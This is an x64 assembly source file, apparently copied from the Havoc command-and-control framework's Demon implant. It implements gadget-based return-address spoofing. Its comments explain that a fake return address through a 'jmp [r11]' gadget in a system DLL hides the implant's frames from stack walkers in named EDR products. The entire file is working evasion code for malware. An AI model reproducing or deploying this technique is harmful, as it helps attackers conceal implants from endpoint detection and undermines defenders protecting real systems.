; stack_spoof.x64.asm
; Copied verbatim from HavocFramework/Havoc payloads/Demon/src/asm/Spoof.x64.asm (MIT)
;
; Gadget-based return address spoofing.
;
; How it works:
;   1. C code (stack_spoof.c:SpoofRetAddr) finds a `jmp [r11]` gadget in a
;      loaded system DLL (e.g. ntdll, kernelbase).
;   2. This trampoline pushes a fake return address (the gadget) so that when
;      the called function returns it jumps through the gadget, not back into
;      the implant.
;   3. A PRM (param) struct carries the original return address and function
;      pointer so the fixup label can restore execution correctly.
;
; Stack walkers (CrowdStrike, SentinelOne, Defender ATP) unwind the call
; stack and see only system DLL frames — the implant is invisible.

[BITS 64]

DEFAULT REL

GLOBAL Spoof

SECTION .text

Spoof:
    pop    r11                  ; save real return address (into implant)
    add    rsp, 8               ; skip alignment slot
    mov    rax, [rsp + 24]      ; rax = &PRM
    mov    r10, [rax]           ; r10 = PRM.Trampoline (jmp [r11] gadget addr)
    mov    [rsp], r10           ; overwrite return address with trampoline addr
    mov    r10, [rax + 8]       ; r10 = PRM.Function (real target to call)
    mov    [rax + 8], r11       ; PRM.Function = saved real return addr
    mov    [rax + 16], rbx      ; PRM.Rbx = saved rbx
    lea    rbx, [fixup]         ; rbx = address of fixup label below
    mov    [rax], rbx           ; PRM.Trampoline = fixup (so gadget jumps here)
    mov    rbx, rax             ; rbx = &PRM (preserved across the call)
    jmp    r10                  ; call the real target function

fixup:
    sub    rsp, 16
    mov    rcx, rbx             ; rcx = &PRM
    mov    rbx, [rcx + 16]      ; restore rbx
    jmp    QWORD [rcx + 8]      ; jump to original return address (back into implant)
